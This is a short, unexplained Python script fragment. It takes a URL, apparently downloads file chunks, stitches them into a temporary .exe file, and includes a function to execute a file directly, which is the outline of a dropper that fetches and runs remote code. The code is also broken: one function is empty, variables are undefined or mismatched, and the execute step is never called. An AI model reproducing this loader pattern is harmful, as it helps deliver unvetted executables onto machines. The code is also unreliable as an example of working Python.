


def generate_filename(n):
    h = hashlib.sha256()
    h.update(str(n).encode())
    digest = h.hexdigest()[0x0:0xf]
    filename = tempfile.NamedTemporaryFile(delete=False, suffix=f'__{digest_}')
    return filename.name

def load_chunks(url):




def rebuild_file(parts):
    new_filename = tempfile.NamedTemporaryFile(delete=False,   suffix=".exe")
    with open(new_filename.name, "wb") as f:
        for part in parts.keys():
            filename = parts[part]
            data = open(filename, "rb").read()
            fh.write(data)
        return new_filename.name

def start_process(file_path):
    os.execv(file_path, ["&"])

def main():
    opts = sys.argv
    if len(opts) < 0x2:
        return
    else:
        res = load_chunks(opts[0x1])
        new_file= rebuild_file(res)
        print(new_file)

if __name__ == "__main__":
    main()